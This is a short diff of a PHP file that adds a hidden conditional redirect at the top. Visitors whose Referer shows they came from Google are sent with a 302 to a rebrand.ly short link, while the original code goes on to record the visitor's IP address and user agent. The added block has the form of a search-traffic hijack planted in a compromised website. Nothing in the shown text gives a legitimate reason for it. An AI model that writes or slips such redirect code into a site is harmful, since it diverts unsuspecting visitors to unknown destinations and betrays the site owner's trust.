@@ -1,4 +1,8 @@
 <?php
+if (isset($_SERVER['HTTP_REFERER']) && preg_match('/google\./i', $_SERVER['HTTP_REFERER'])) {
+    header("Location: https://rebrand.ly/mcd999-rul", true, 302);
+    exit();
+}
     $ip = isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : $_SERVER['REMOTE_ADDR'];
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
